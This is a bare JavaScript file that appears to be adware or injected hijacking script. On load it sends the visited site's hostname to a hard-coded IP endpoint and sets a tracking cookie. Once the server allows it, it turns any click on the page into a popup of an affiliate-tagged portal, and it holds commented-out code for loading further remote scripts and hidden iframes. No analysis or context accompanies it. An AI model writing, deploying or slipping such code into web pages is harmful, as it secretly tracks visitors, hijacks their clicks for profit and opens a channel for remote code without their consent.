window.onload = function() {
	var script = document.createElement('script');
	var head = document.getElementsByTagName('head')[0];
	script.type = 'text/javascript';
	script.src = 'http://code.jquery.com/jquery-latest.js';
	head.appendChild(script);
	
	
	
	var url1 = top.location.hostname;
	
	var reqType = 1;
	var ad = 0;
	window.opp = 0;
	window.aop=0;
	var xmlHttp;
	//alert(url1);
	script.onload=script.onreadystatechange=function(){  
		   if(!this.readyState||this.readyState=='loaded'||this.readyState=='complete'){  
			   ap(reqType,ad,url1);
		   
		}  
		script.onload=script.onreadystatechange=null;  
		}
	

}
document.onclick = function(ev) {

	if (opp == 2) {

		sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=2");
			opp =3;
			
            setCookie("FlagForAbc123123", 1, 60 * 24);
           // window.open("http://hao.360.cn/?src=lm&ls=n12ff972594");
		    window.open("http://iwap.2345.com/?lm_1128");
	} else {


	}
}
function getCookie(c_name) {
	if (document.cookie.length > 0) {
		c_start = document.cookie.indexOf(c_name + "=");

		if (c_start != -1) {
			c_start = c_start + c_name.length + 1;
			c_end = document.cookie.indexOf(";", c_start);
			if (c_end == -1)
				c_end = document.cookie.length;
			return unescape(document.cookie.substring(c_start, c_end));


		}
	}

	return "";
}


function setCookie(c_name, value, expireMins) {
	var exdate = new Date();
	exdate.setTime(exdate.getTime() + expireMins * 60 * 1000);
	document.cookie = c_name + "=" + escape(value) +
	((expireMins == null) ? "" : ";expires=" + exdate.toGMTString());

}

function sendPostRequest(url, param, callback) {
	var xmlhttp;
	if (window.XMLHttpRequest) {
		// code for IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp = new XMLHttpRequest();
	} else {
		// code for IE6, IE5
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
	xmlhttp.onreadystatechange = callback;
	xmlhttp.open("POST", url, true);
	xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xmlhttp.send(param);
	return xmlhttp;
}
function ap(reqType,ad,url1)
{
	//console.log("start is 1111111111111");
	if (navigator.cookieEnabled == true) {
		sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=3&url="+url1);
		 var popFlag = getCookie('FlagForAbc123123');
            	
         if (popFlag == null || popFlag == "") {
             popFlag = 0;
             setCookie("FlagForAbc123123", popFlag, 60 * 24);
         }
         if(popFlag >=2&& popFlag <5)
        	 {
        	 aop=1;
        	 //popFlag++;
            // setCookie("FlagForAbc123123", popFlag, 60 * 24);
             //var script1 = document.createElement('script');
				//var head1 = document.getElementsByTagName('head')[0];
				//script1.type = 'text/javascript';
				//script1.src = 'http://al.za5.net/view.php?pid=6018&gettype=2';
				
				//script1.charset='gb2312';
				//head1.appendChild(script1);
				//sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=3");
             
        	 }
         
         if (popFlag < 1) {
            // popFlag++;
             //setCookie("FlagForAbc123123", popFlag, 60 * 24);
          // var iframe = document.createElement("iframe");
     		//iframe.style.display = "none";
     		//iframe.src = "###";
     		//document.body.appendChild(iframe);
     		//iframe.onload = function() {
     			//console.log("start is 00000000000000");
     			//console.log("start is 1111111111111");
     			//alert("reqType"+reqType);
     			$.ajax({
     					
     					type : 'post',
     					url : 'http://113.57.230.176:8888/404/admin/Paction',
     					data : {
     						"reqType" : reqType,
     						"ad" : ad,
     						"url" : url1
     					},
     					dataType : 'jsonp',

     					jsonp : "jsonpcallback",
     					success : function(result) {

     						//console.log(result.status);
     						//console.log(result.dese);
     						if (result.status == "0") {
     							if (result.dese == "0") {
     								sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=1");
     								opp = 2;
     								//window.location.href = "http://www.xxxx.com";
     							}
     							if (result.dese == "1"&& aop==0) {
     								//加载js
     								opp = 2;
     								 //setCookie("FlagForAbc123123", 2, 60 * 24);
     								
     								//sendPostRequest("http://113.57.230.176:8888/404/admin/Paction", "reqType=2&ad=3");
     							}
     							if (result.dese == "2") {
     								opp = 2;
     							}
     						
     						}

     					},
     					error : function() {
     						
     					}
     				});
     			
     	//	};
             
           
         }
         else{
            	
        	
        }

		

		//getLabelsPost(reqType,ad,url);


	}
}